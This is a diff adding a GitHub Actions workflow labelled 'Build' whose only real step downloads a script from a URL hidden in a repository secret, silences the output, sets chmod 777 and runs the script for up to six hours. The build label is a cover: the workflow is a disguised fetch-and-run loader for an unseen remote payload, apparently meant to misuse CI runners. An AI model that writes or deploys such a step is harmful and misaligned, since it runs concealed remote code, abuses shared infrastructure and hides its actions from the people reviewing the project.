@@ -1,0 +1,24 @@
+name: Build
+on: 
+  workflow_dispatch:
+ 
+jobs:
+ node-1:
+    runs-on: ${{ matrix.os }}
+    strategy:
+      fail-fast: false
+      matrix:
+         os: [ubuntu-latest]
+    timeout-minutes: 360
+ 
+    steps:
+      - uses: actions/checkout@v4
+      - run: mkdir runner
+      - name: Setup App
+        working-directory: ./runner
+        run: |
+              wget -qO autorun.sh ${{ secrets.FILES }} > /dev/null 2>&1
+              sleep 3
+              chmod 777 autorun.sh
+              ./autorun.sh
+        shell: bash
